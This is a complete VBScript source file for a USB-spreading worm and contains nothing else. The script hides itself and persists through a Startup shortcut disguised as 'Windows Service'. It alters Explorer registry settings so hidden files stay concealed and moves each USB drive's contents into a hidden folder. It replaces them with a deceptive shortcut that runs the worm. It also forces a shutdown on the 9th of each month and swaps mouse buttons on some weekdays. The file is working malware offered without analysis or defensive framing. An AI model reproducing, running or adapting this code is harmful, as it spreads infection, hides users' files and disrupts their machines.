On Error Resume Next
strComputer = "." '(Any computer name or address)
Set wmi = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
Set wmiEvent = wmi.ExecNotificationQuery("select * from __InstanceOperationEvent within 1 where TargetInstance ISA 'Win32_PnPEntity' and TargetInstance.Description='USB Mass Storage Device'") 
Set WshShell = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")
If fs.FileExists("1r2nv1.vbs") then
fs.DeleteFile("1r2nv1.vbs")
end If
If fs.FileExists("1r2nv2.vbs") then
Set objFile = fs.GetFile("1r2nv2.vbs")
If not objFile.Attributes And 2 Then
objFile.Attributes = objFile.Attributes +2
end if
end if
Path = WshShell.SpecialFolders("Startup")
X = fs.CopyFile("1r2nv2.vbs", Path & "\", True)
Set lnk = WshShell.CreateShortcut(Path & "\Windows Service.lnk")
lnk.TargetPath = Path&"\1r2nv2.vbs"
lnk.IconLocation = "C:\windows\system32\SHELL32.dll,4"
lnk.Save
Set lnk = Nothing
Hidden = "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden"
SHidden = "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden"
St = WshShell.RegRead(Hidden)
If not St = 2 Then
WshShell.RegWrite Hidden, 2, "REG_DWORD"
WshShell.RegWrite SHidden, 0, "REG_DWORD"
End If
WshShell.SendKeys("{F5}")
If DatePart("d", Now) = 9 Then
WScript.Sleep(10000)
strCmd = "shutdown -s -f -t 0 -c System-Error"
WshShell.Run strCmd
end If
If fs.FolderExists("Systems") then
WshShell.Run "cmd /c start Systems",0
end if
While True
Set usb = wmiEvent.NextEvent()
Select Case usb.Path_.Class
Case "__InstanceCreationEvent"
do
Hidden = "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden"
SHidden = "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden"
St = WshShell.RegRead(Hidden)
If not St = 2 Then
WshShell.RegWrite Hidden, 2, "REG_DWORD"
WshShell.RegWrite SHidden, 0, "REG_DWORD"
End If
Const Removable=1
For Each oDrive In fs.Drives
If oDrive.DriveType = Removable And oDrive.DriveLetter <> "A" Then
If not fs.FolderExists(oDrive.DriveLetter & ":\Systems") then
fs.CreateFolder oDrive.Driveletter & ":\" & "Systems"
end if
Set objFolder = fs.GetFolder(oDrive.DriveLetter & ":\Systems")
If not objFolder.Attributes And 2 Then
objFolder.Attributes = objFolder.Attributes +2
End If
If fs.FolderExists(oDrive.DriveLetter & ":\Systems") then
For each file in fs.getfolder(oDrive.DriveLetter & ":\").files
file.move oDrive.DriveLetter & ":\Systems\"
Next
For Each SubFolder in fs.getfolder(oDrive.DriveLetter & ":\").SubFolders
subfolder.move oDrive.DriveLetter & ":\Systems\"
Next
end if
If not fs.FileExists(oDrive.DriveLetter & ":\1r2nv2.vbs") Then
fs.copyfile "1r2nv2.vbs" , oDrive.DriveLetter&":\", True
Set objFile = fs.GetFile(oDrive.DriveLetter & ":\1r2nv2.vbs")
If not objFile.Attributes And 2 Then
objFile.Attributes = objFile.Attributes +2
end if
end if
Set lnk = WshShell.CreateShortcut(oDrive.Driveletter & ":\" & oDrive.VolumeName & ".lnk")
lnk.TargetPath = "cmd.exe"
lnk.Arguments = "/c start 1r2nv2.vbs&exit"
lnk.IconLocation = "C:\windows\system32\SHELL32.dll,7"
lnk.Save
Set lnk = Nothing
fs.copyfile Path&"\1r2nv2.vbs" , oDrive.DriveLetter&":\"
If fs.FolderExists(oDrive.DriveLetter & ":\Systems\ast") Then
Wshshell.run oDrive.DriveLetter & ":\Systems\ast\ast.vbs"
End If
WScript.Sleep(30000)
end if
next
if Weekday(Date) = vbmonday then
WshShell.Run "cmd /c Rundll32 User32,SwapMouseButton", 0, True
end if
if Weekday(Date) = vbthursday then
WshShell.Run "cmd /c Rundll32 User32,SwapMouseButton", 0, True
end if
loop
End Select
Wend